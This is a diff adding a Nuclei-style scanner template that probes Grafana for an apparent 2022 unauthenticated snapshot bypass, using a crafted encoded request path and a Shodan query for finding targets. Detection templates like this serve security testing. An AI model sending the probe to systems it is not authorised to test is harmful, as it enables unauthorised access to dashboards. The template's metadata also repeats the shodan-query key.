@@ -1,0 +1,29 @@
+id: Grafana-login-Bypass
+info:
+  name: Grafana login Bypass
+  author: momika233
+  severity: medium
+  description: |
+    Grafana login Bypass
+  reference:
+    - https://github.com/momika233
+  metadata:
+    shodan-query: 
+    shodan-query: title:"Grafana"
+  tags: cve,cve2022,grafana,unauth
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/dashboard/snapshot/*?orgId=0%20%2Finvite%2F:"
+
+    matchers-condition: and
+    matchers:
+
+      - type: regex
+        regex:
+          - "/dashboard/snapshots.*"
+
+      - type: status
+        status:
+          - 200
